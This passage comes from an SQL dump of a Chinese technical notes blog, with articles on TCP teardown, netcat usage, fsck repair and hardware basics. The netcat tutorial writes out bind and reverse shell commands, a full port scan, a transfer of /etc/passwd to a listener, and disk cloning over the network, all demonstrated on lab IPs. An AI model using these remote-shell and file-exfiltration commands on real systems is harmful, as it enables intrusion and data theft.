服务端无数据发送客户端后，发送 fin 请求与客户端断开连接；\n4. 客户端接收到 fin 后返回给服务端 ack，服务端接收到 ack 后，断开连接成功。</pre>','TCP 四次挥手','network','2022-05-20 12:37:40',0,'07b135a73f0c4244ab0278c122ab8782'),(51,'<h3>1、做客户端使用</h3>\n<p>nc -nv 对方ip 对方端口</p>\n<h3>2、传输文本信息</h3>\n<h4>1、服务端启动端口，客户端连接后即可聊天</h4>\n<pre class=\"language-markup\"><code># 服务端启用端口\n[root@local-db ~]# nc -l -p 333\naaa\nbbb\n# 客户端连接可聊天\n└─$ nc -nv 192.168.133.133 333\n(UNKNOWN) [192.168.133.133] 333 (?) open\naaa\nbbb\n</code></pre>\n<h4>2、电子取证</h4>\n<pre class=\"language-markup\"><code># 1. 服务端启用监听\n[root@local-db ~]# nc -l -p 333\n# 2. 客户端连接\n$ ls -l | nc -nv 192.168.133.133 333\n(UNKNOWN) [192.168.133.133] 333 (?) open\n# 3. 服务端接收到数据\n[root@local-db ~]# nc -l -p 333\n总用量 32\ndrwxr-xr-x 2 steve steve 4096  4月 25 21:25 公共\ndrwxr-xr-x 2 steve steve 4096  4月 25 21:25 模板\ndrwxr-xr-x 2 steve steve 4096  4月 25 21:25 视频\ndrwxr-xr-x 2 steve steve 4096  4月 25 21:25 图片\ndrwxr-xr-x 2 steve steve 4096  4月 25 21:25 文档\ndrwxr-xr-x 2 steve steve 4096  4月 25 21:25 下载\ndrwxr-xr-x 2 steve steve 4096  4月 25 21:25 音乐\ndrwxr-xr-x 3 steve steve 4096  5月  9 17:52 桌面\n</code></pre>\n<pre class=\"language-markup\"><code># 1. 服务端启用端口\n[root@local-db ~]# nc -l -p 333 &gt; ps.txt\n# 2. 客户端连接收集数据\n$ ps aux | nc -nv 192.168.133.133 333 -q 1\n(UNKNOWN) [192.168.133.133] 333 (?) open\n# 3. 服务端 ps.txt 收集完成\n[root@local-db ~]# cat ps.txt</code></pre>\n<h4>3、传输文件</h4>\n<p>1、服务端给客户端传输文件</p>\n<pre class=\"language-markup\"><code># 1. 服务端启用监听\n[root@local-db ~]# nc -lp 333 &gt; passwd.txt\n# 2. 客户端连接发送文件\n$ nc -nv 192.168.133.133 333 &lt; /etc/passwd -q 1\n(UNKNOWN) [192.168.133.133] 333 (?) open\n# 3. 服务端查看接收到的数据\n[root@local-db ~]# cat passwd.txt</code></pre>\n<p>2、客户端给服务端传输文件</p>\n<pre class=\"language-markup\"><code># 1. 服务端启用端口，准备发送文件\n[root@local-db ~]# nc -lp 333 &lt; passwd.txt\n# 2. 客户端启用连接\n$ nc -nv 192.168.133.133 333 &gt; 1.txt -q 1      \n(UNKNOWN) [192.168.133.133] 333 (?) open\n# 3. 客户端查看传递过来的数据\n$ cat 1.txt</code></pre>\n<h4>4、传输目录</h4>\n<pre class=\"language-markup\"><code># 1. 服务端打包目录传给nc\n[root@local-db ~]# tar -cvf - /data/ans/ | nc -lp 333\n# 2. 客户端连接端口获取目录\n$ nc 192.168.133.133 333 | tar -xvf -</code></pre>\n<h4>5、加密传输文件</h4>\n<pre class=\"language-markup\"><code># 1. 服务端启用端口接收加密文件并解密\n[root@local-db ~]# nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.txt\n# 2. 客户端连接发送并加密文件\n$ mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; 1.txt | nc -nv 192.168.133.133 333 -q 1 \nEnter the passphrase (maximum of 512 characters)\nPlease use a combination of upper and lower case letters and numbers.\nEnter passphrase: (UNKNOWN) [192.168.133.133] 333 (?) open\n\nEnter passphrase: \n# 输入两遍加密密码\n# 3. 服务端输入密码\n[root@local-db ~]# nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.txt\nEnter passphrase: \n# 4. 查看解密后的文件 1.txt\n[root@local-db ~]# cat 1.txt</code></pre>\n<h4>6、远程克隆硬盘</h4>\n<pre class=\"language-markup\"><code># 1. 服务端接收数据写入硬盘\nnc -lp 333 | dd of=/dev/sda\n# 2. 客户端启用连接发送数据\ndd if=/dev/sda | nc -nv 192.168.133.133 -q 1</code></pre>\n<h3>3、端口扫描</h3>\n<p>1、做客户端端口扫描</p>\n<pre class=\"language-markup\"><code>$ nc -nvz 192.168.133.133 1-65535\n(UNKNOWN) [192.168.133.133] 8081 (tproxy) open\n(UNKNOWN) [192.168.133.133] 8000 (?) open\n(UNKNOWN) [192.168.133.133] 3306 (mysql) open\n(UNKNOWN) [192.168.133.133] 80 (http) open\n(UNKNOWN) [192.168.133.133] 22 (ssh) open</code></pre>\n<h3>4、远程控制</h3>\n<h4>1、正向</h4>\n<pre class=\"language-markup\"><code># 1. 服务端启用端口，并共享 bash\n[root@local-db ~]# nc -lp 333 -c bash\n# 2. 客户端连接，并操作服务端 bash\n$ nc -nv 192.168.133.133 333             \n(UNKNOWN) [192.168.133.133] 333 (?) open\nls\n1.txt\nanaconda-ks.cfg\n# 客户端可以获取到服务端的 shell 进行操作</code></pre>\n<h4>2、反向</h4>\n<pre class=\"language-markup\"><code># 1. 服务端启用端口\n[root@local-db ~]# nc -lp 333\n# 2. 客户端连接端口并共享自己的 shell\n$ nc -nv 192.168.133.133 333  -c bash\n(UNKNOWN) [192.168.133.133] 333 (?) open\n# 3. 服务端可以获取到客户端的 shell\n[root@local-db ~]# nc -lp 333\nls\n1.txt\n公共\n模板\n视频\n图片\n文档\n下载\n音乐\n桌面\n# 反向连接可以防止从外向内的连接被防火墙拒绝</code></pre>\n<p>注：windows 用户把 bash 改成 cmd</p>\n<p>NC缺乏加密和身份验证的能力</p>\n<p>5、NCAT</p>\n<p>1、包含于 nmap 工具包中，解决加密问题</p>\n<p>2、演示</p>\n<pre class=\"language-markup\"><code># 1. 服务端启动端口，并只允许指定ip访问\n[root@local-db ~]# ncat -c bash --allow 192.168.133.128 -vnl 333 --ssl\nNcat: Version 7.50 ( https://nmap.org/ncat )\nNcat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.\nNcat: SHA-1 fingerprint: 8207 BCD7 07D4 2D3A 9E66 1B99 FF92 BB45 1EE0 2275\nNcat: Listening on :::333\nNcat: Listening on 0.0.0.0:333\n# 2. 客户端连接端口\n$ ncat -nv 192.168.133.133 333 --ssl\nNcat: Version 7.92 ( https://nmap.org/ncat )\nNcat: Subject: CN=localhost\nNcat: Issuer: CN=localhost\nNcat: SHA-1 fingerprint: 5753 B3B2 98AE 34AB DBA6 2C5F 2FD3 CFD0 2C86 686F\nNcat: Certificate verification failed (self signed certificate).\nNcat: SSL connection to 192.168.133.133:333.\nNcat: SHA-1 fingerprint: 5753 B3B2 98AE 34AB DBA6 2C5F 2FD3 CFD0 2C86 686F\n# 3. 服务端接收到客户端的连接\n[root@local-db ~]# ncat -c bash --allow 192.168.133.128 -vnl 333 --ssl\nNcat: Version 7.50 ( https://nmap.org/ncat )\nNcat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.\nNcat: SHA-1 fingerprint: 5753 B3B2 98AE 34AB DBA6 2C5F 2FD3 CFD0 2C86 686F\nNcat: Listening on :::333\nNcat: Listening on 0.0.0.0:333\nNcat: Connection from 192.168.133.128.\nNcat: Connection from 192.168.133.128:60150.\n# 4. 客户端可以远程控制服务端了</code></pre>','nc 使用','security','2022-05-20 12:37:27',0,'07b135a73f0c4244ab0278c122ab8782'),(52,'<h3>1、现象</h3>\n<p>linux 下文件信息出现乱码，无法启动服务，也无法删除、改权限等等，那证明你的磁盘已损坏，需要修复，期间不会丢失数据，请放心操作</p>\n<h3>2、fsck 修复磁盘</h3>\n<p>1、一定要进入单用户模式去修复</p>\n<p>2、查看文件系统</p>\n<pre class=\"language-markup\"><code>[root@local-db ~]# df -T /dev/sda1\nFilesystem     Type 1K-blocks   Used Available Use% Mounted on\n/dev/sda1      xfs    1038336 140340    897996  14% /boot</code></pre>\n<p>3、fsck 修复</p>\n<pre class=\"language-markup\"><code>umount /xxx\nfsck -t ext4 -v /dev/sda1\n###一路y即可完成修复</code></pre>\n<div id=\"simple-translate\">\n<div>\n<div class=\"simple-translate-button isShow\" style=\"background-image: url(\'chrome-extension://ibplnjkanclpjokhdolnendpplpjiace/icons/512.png\'); height: 22px; width: 22px; top: 358px; left: 111px;\">&nbsp;</div>\n<div class=\"simple-translate-panel \" style=\"width: 300px; height: 200px; top: 0px; left: 0px; font-size: 13px; background-color: #ffffff;\">\n<div class=\"simple-translate-result-wrapper\" style=\"overflow: hidden;\">\n<div class=\"simple-translate-move\" draggable=\"true\">&nbsp;</div>\n<div class=\"simple-translate-result-contents\">\n<p class=\"simple-translate-result\" dir=\"auto\" style=\"color: #000000;\">&nbsp;</p>\n<p class=\"simple-translate-candidate\" dir=\"auto\" style=\"color: #737373;\">&nbsp;</p>\n</div>\n</div>\n</div>\n</div>\n</div>','磁盘数据修复','structure','2022-05-20 17:51:07',0,'07b135a73f0c4244ab0278c122ab8782'),(53,'<h3>1、冯诺依曼体系结构</h3>\n<ul>\n<li>所有数据和指令二进制表示</li>\n<li>顺序执行程序</li>\n<li>运算器、存储器、控制器、输入设备和输出设备\n<ul>\n<li>存储器\n<ul>\n<li>RAM内存</li>\n<li>ROM硬盘</li>\n</ul>\n</li>\n<li>CPU\n<ul>\n<li>运算器</li>\n<li>控制器</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3>2、硬盘</h3>\n<h4>1、机械硬盘HDD</h4>\n<p>1、一般7200转/分，每秒读取120M数据</p>\n<p>2、影响读取速度的两个要素：寻道时间 和 磁盘转速</p>\n<p>3、一个扇区 4k</p>\n<h4>2、固态硬盘SSD</h4>\n<p>1、通过闪存颗粒来存储数据</p>\n<p>2、是普通机械硬盘的 3-5 倍</p>','计算机硬件软件体系','structure','2022-05-20 18:49:16',0,'07b135a73f0c4244ab0278c122ab8782'),(54,'```\n#!/bin/bash\nfile=tmp.html\necho \"<h3>查看主机名</h3>\" >> $file\necho \"<pre>\" >> $file\nhostname >> $file\necho \"</pre>\" >> $file\necho \"<h3>查看内核/操作系统/CPU信息</h3>\" >> $file\necho \"<pre>\" >> $file\nuname -a >> $file\necho \"</pre>\" >> $file\necho \"<h3>查看CPU信息</h3>\" >> $file\necho \"<pre>\" >> $file\ncat /proc